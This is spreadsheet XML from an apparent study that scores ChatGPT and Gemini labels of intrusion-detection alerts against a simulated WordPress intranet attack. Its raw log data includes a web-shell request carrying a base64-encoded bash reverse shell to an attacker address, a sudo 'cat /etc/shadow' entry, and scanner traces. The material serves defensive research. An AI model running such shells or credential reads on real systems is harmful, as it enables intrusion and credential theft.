            <text:p>Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on high entropy of payload in WordPress upload fold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based on tool name su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Persistence</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based on tool name su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 </text:p>
            <text:p>Privilege Escalation</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based on tool name su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 </text:p>
            <text:p>Persistence</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_acct parameter combination in Audit logs.”, “New value combination(s) detected”,</text:p>
            <text:p>Raw Data: “type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name su </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Manipulation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”,</text:p>
            <text:p>Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name su </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ersistence,</text:p>
            <text:p>Privilege Escalation</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based on tool name su </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B55])" office:value-type="float" office:value="89" calcext:value-type="float">
            <text:p>89</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_chatgpt_run4" table:style-name="ta1">
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co30" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co44" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co45" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co46" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co33"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10" calcext:value-type="float">
            <text:p>10</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”,</text:p>
            <text:p>Raw Data: “jonesmorgan-mail dovecot: imap-login: Login: user=&lt;susan.gregory&gt;, method=PLAIN, rip=192.168.128.170, lip=192.168.128.170, mpid=20031, TLS, session=&lt;Z7YRAMTVOOfAqICq&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on imag login and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Valid Account Abuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”, </text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Login: user=&lt;damian.jordan&gt;, method=PLAIN, rip=192.168.128.195, lip=192.168.128.195, mpid=4084, TLS, session=&lt;kj6o/tnVnr3AqIDD&gt;”,</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on imag login and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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TLS Evasion,</text:p>
            <text:p>Encrypted C2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”, “SURICATA TLS invalid handshake message”,</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name Suricata and protocol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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Protocol Anomaly, </text:p>
            <text:p>Encrypted Traffic Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”, “SURICATA TLS invalid handshake message”,</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>based on tool name Suricata and protocol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Reconnaissance,</text:p>
            <text:p>Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: “internal-share sshd[28182]: Did not receive identification string from [IP] port [Port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>based on tool name SSH and the identification string that has not been received</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SSH Scan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: “webserver sshd[25473]: Did not receive identification string from [IP] port [Port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>based on tool name SSH and the identification string that has not been receive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Misuse, </text:p>
            <text:p>Malicious SMTP Activity</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA SMTP invalid reply [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>based on tool name Suricata and protocol SMTP</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Unauthorized Directory Access Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Scanning is not represented in th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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Tool name (nmap) did not make the results more detailed</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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ordPress Plugin Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,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text:span text:style-name="T4">Classification probably </text:span>based on tool name WPSca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Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/click-to-chat-for-whatsapp/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPScan</text:p>
            <text:p>Unclear however, why it did not get the same label as befor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ning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/constant-contact-forms/ HTTP/1.1 404 146 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/better-wp-security/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPSca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Web Application Scanning,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance” </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/easy-login-woocommerce/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPSca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Web Application Scanning, </text:p>
            <text:p>Sensitive File Access Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “HEAD /wp-config.php- HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name WPSca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Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on 404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Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”,</text:p>
            <text:p>Raw Data: “GET /accountants HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on 404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Application Scanning,</text:p>
            <text:p>Credential Access Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /wp-admin/user/webcalendar HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on 404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to Protected Resource,</text:p>
            <text:p>Credential Access Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/plugins/.htpasswd_”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Scanning is not represented in th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Exploitation, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/_vti_bin/_vti_aut/author.dll HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on access attempt to plugin folder and dll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Web Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/skins/wordpress/i HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on access attempt to plugin folder and dll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Reconnaissance,</text:p>
            <text:p>Directory Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/skins/wordpress/ibm HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on access attempt to plugin folder and dll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Valid Accounts</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “miller-mail dovecot: imap-login: Login: user=&lt;megan.johnson&gt;, method=PLAIN, rip=192.168.129.212, lip=192.168.129.212, mpid=28005, TLS, session=&lt;o6XRidrVbpzAqIHU&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification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Valid Account</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648, TLS, session=&lt;5+7kjdrVtr7AqIDD&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on IDS mitre classification</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TLS Protocol Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid handshake message”, “SURICATA TLS invalid record/traffic“</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on tool name suricata and protocol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Valid Account Usage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “jonesmorgan-mail dovecot: imap-login: Login: user=&lt;susan.gregory&gt;, method=PLAIN, rip=192.168.128.170, lip=192.168.128.170, mpid=28776, TLS, session=&lt;6UY2utrVPurAqICq&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification based on usage of imap log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Brute Force</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Valid Account Usage, </text:p>
            <text:p>Privilege Escalation</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tool name su; change of UI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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Account Usage</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mitre) IDS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Successful sudo to ROOT executed.”, mitre – technqi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mitre IDS classification and use of tool name sudo</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iscovery</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ls -laR /root/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on mitre IDS classification and access to root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Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed.”, mitre – technique: “Sudo and Sudo Caching”, id: “T1548.003”, tactic: “Privilege Escalation”, “Defense Evasion”, </text:p>
            <text:p>Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on mitre IDS classification and tool name sudo</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B33])" office:value-type="float" office:value="85" calcext:value-type="float">
            <text:p>85</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_aminer_gemini_run4" table:style-name="ta1">
        <table:table-column table:style-name="co1"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29" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co50"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6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command and Control, </text:p>
            <text:p>Exfiltration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in DNS domain.”, “Value entropy anomaly detected”,</text:p>
            <text:p>Raw Data: “dnsmasq[14460]: query[A] youtu.be from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on dnsmasq and high entropy in DNS domai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Reconnaissance, </text:p>
            <text:p>Command and Control</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”,</text:p>
            <text:p>Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org from [IP]“</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on dnsmasq and high frequency of query record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Brute Force, </text:p>
            <text:p>Credential Stuffing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=&lt;&gt;, rip=192.168.130.77, lip=192.168.128.195, session=&lt;hifuP9rVVNbAqIJN&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on login attempts without auth attemp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Web Attack, </text:p>
            <text:p>Application Layer Attack</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on <text:s/>repeated unsuccessful access to web root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Network Scan, </text:p>
            <text:p>Denial of Service</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on TLS error received, potential malformed TLS paket</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 </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”, “POST /sdk HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</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New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 403 http status code</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Discovery, </text:p>
            <text:p>Vulnerability Scanning</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nmap and 403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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Discovery, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/HNAP1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Classification probably </text:span>based on attempted access to known web application path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Discovery, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and 403 error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Discovery,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/analytics-for-wp/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and 404 error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0" calcext:value-type="float">
            <text:p>10</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/animated-typing-effect/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404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Vulnerability Scanning, </text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/eCobiz/timthumb.php HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and 404 status cod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Information Gathering, </text:p>
            <text:p>Credential Access, </text:p>
            <text:p>Brute Force</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attempted access to .htpasswd</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information Gathering, </text:p>
            <text:p>Path Traversal, </text:p>
            <text:p>Discovery</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and 404 http cod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Vulnerability Scanning,  </text:p>
            <text:p>Information Gathering, </text:p>
            <text:p>Exploitation for Client Execution</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ccess to non-existent php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 </text:p>
            <text:p>Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/sitemaps/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and 404 http code; scanning not represented</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Path Traversal, </text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/thickbox/~www HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and 404 http code, no scanning represented</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  </text:p>
            <text:p>Directory Listing</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directory without directory index</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File Enumeration</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ccess to sensitive .hta config file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formation Gathering,</text:p>
            <text:p>Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 301 http code (redirect) and tool name apach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Vulnerability Scanning</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Classification probably based on access attempt to common server configuration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Reconnaissance,  </text:p>
            <text:p>Information Gathering</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ccess attempt to common server configuration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Directory Traversal Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on 403 http code (redirect) and tool name apach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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p>Information Gathering,</text:p>
            <text:p>File Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and 404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Information Gathering, </text:p>
            <text:p>Web Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and 404 http code</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>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Exploit Attempt,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to common php config fil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Web Content Discovery,</text:p>
            <text:p>Attempted Access to Sensitive Files</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attempted access to sensitive files and directory</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Information Gathering, </text:p>
            <text:p>Credential Access,</text:p>
            <text:p>Attempted Access to Sensitive Files</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attempted access to sensitive files and directory</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
